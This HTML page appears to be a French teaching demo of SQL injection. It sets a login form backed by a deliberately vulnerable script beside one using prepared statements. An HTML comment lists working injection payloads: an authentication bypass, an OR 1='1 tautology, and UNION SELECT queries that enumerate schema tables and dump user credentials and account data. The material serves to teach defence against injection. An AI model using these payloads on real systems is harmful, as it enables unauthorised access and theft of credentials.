<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=h1, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>La faille SQLi</h1>

    <!--
    Accès normal : login=(pierre) password=(654321)
    Bypass d'authentification : login=(pierre'#) password=(coucou)
    Injection d'évaluation true : login=(coucou) password=(coucou' OR 1='1)
    Evasion de la table cible : login=(coucou) password=(blabla' AND 1=0 UNION SELECT database(), t.table_name, concat(c.column_name,':',c.data_type) FROM information_schema.tables AS t NATURAL JOIN information_schema.columns AS c WHERE table_schema = database() # )
    Evasion des données d'une table : login=(coucou) password=(blabla' AND 1=0 UNION SELECT login, pass, id FROM users #)
    Evasion de toutes les données : login=(coucou) password=(blabla' AND 1=0 UNION SELECT concat('User = ' , A.id,':',A.login, ":", A.pass), concat('Account = ' , B.id,':',B.type), B.amount FROM users AS A JOIN accounts AS B ON B.id_users = A.id # )
    -->
    <h2>Requête non protégée</h2>
    <form action="sqli_vulnerable.php" method="post">
        <label for="">Login : </label><input type="text" name="login" required>
        <label for="">Password : </label><textarea name="password" required></textarea>
        <input type="submit" value="Login">
    </form>

    <h2>Requête préparée</h2>
    <form action="sqli_prepared.php" method="post">
        <label for="">Login : </label><input type="text" name="login" required>
        <label for="">Password : </label><textarea name="password" required></textarea>
        <input type="submit" value="Login">
    </form>

</body>
</html>
